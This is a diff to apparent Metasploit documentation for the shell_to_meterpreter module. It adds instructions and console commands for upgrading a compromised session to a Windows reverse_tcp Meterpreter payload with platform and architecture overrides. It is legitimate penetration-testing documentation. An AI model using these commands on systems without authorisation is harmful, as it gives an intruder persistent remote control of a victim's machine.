@@ -20,3 +20,13 @@ run session=-1
 run session=-1 win_transfer=POWERSHELL
 run session=-1 win_transfer=VBS
 ```
+
+If you want to upgrade your shell with fine control over what payload, use the `PAYLOAD_OVERRIDE`, `PLATFORM_OVERRIDE`, and on windows, `PSH_ARCH_OVERRIDE`. All 3 options are required to set an override on windows, and the first two options are required on other platforms, unless you are not using an override.
+
+```
+use multi/manage/shell_to_meterpreter
+set SESSION 1
+set PAYLOAD_OVERRIDE windows/meterpreter/reverse_tcp
+set PLATFORM_OVERRIDE windows
+set PSH_ARCH_OVERRIDE x64
+```
